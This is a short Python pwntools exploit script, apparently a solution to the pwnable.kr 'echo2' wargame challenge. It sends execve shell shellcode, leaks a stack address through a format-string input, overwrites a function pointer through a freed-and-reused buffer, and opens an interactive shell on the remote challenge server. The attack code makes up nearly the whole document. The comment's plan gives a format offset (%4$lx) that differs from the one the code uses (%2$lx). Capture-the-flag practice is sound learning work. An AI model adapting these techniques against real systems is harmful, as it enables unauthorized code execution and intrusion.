from pwn import *
"""
Exploit plan
1. "hey, wht's your name? : "
    input> 23Byte shellcode
2. Select menu-2 (echo2)

3. Leak rsp ( shellcode at : rsp + 0x40 )
    input> %4$lx
    
4. Select menu-4 (exit) and send "n"
5. Select menu-3 >>> Modify greetings address to shellcode
    input> 24Byte of stuff + p64(rsp+0x40)
6. Select menu-2 or 3 to run shellcode.
"""

context.log_level = "warning"


def select_menu(num):
    print(p.recvuntil(b"> "))
    p.sendline(num.encode())


#p = process("/root/Downloads/echo2")
#
p = remote("pwnable.kr", 9011)
# 23Bytes shellcode. last "\x90" is for padding.
shell_code = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
print(p.recvuntil(b": ").decode())
p.sendline(shell_code)

select_menu("2")
print(p.recvline())
p.sendline(b"%2$lx")
rsp_add = int(p.recvline().strip().decode(), 16)
print(hex(rsp_add))

pay = b"A"*24
pay += p64(rsp_add + 0x40)

select_menu("4")
print(p.recvuntil(b"/n)").decode())
p.sendline(b"n")

select_menu("3")
print(p.recvline())
p.sendline(pay)

select_menu("2")
p.interactive()
